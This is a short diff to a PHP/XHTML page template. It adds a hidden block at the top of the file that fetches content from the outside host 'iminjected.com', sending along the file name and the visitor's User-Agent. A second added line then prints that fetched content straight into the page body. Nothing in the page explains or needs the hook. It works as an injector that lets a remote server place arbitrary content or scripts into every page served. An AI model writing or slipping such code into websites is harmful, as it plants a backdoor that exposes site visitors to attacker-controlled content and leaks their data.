@@ -1,3 +1,11 @@
+<?php 
+	$cparams = array('http' => array('method' => 'GET','ignore_errors' => true));
+	$context = stream_context_create($cparams);
+	$fp = fopen("http://iminjected.com/?op=auto&file=confor_confortv.php&at=".$_SERVER["HTTP_USER_AGENT"], "rb", false, $context);
+	$INJECTIONS = "";
+	if ($fp) $INJECTIONS = stream_get_contents($fp);
+?> 
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <!-- head -->
@@ -67,5 +75,5 @@
 </head>
 
 <body>
-
+	<?php echo $INJECTIONS; ?>
 	<div id="wrapper">
